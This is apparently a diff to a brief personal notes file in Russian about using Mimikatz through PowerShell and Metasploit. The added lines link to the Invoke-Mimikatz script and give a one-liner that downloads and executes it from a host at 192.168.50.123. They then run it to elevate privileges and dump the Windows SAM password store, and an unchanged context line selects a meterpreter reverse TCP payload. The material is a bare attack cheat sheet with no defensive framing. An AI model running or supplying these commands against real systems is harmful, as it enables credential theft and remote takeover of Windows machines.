@@ -1,5 +1,12 @@
 # mimi
 
+# мимикат повершелл 
+
+        https://github.com/g4uss47/Invoke-Mimikatz
+        IEX(New-Object Net.WebClient).downloadString('http://192.168.50.123:8000/Invoke-Mimikatz.ps1')
+        Invoke-Mimikatz -command "privilege::debug token::elevate lsadump::sam"
+
+
 МИМИКАТЗ в метасплойт
 
 use windows/x64/meterpreter_reverse_tcp
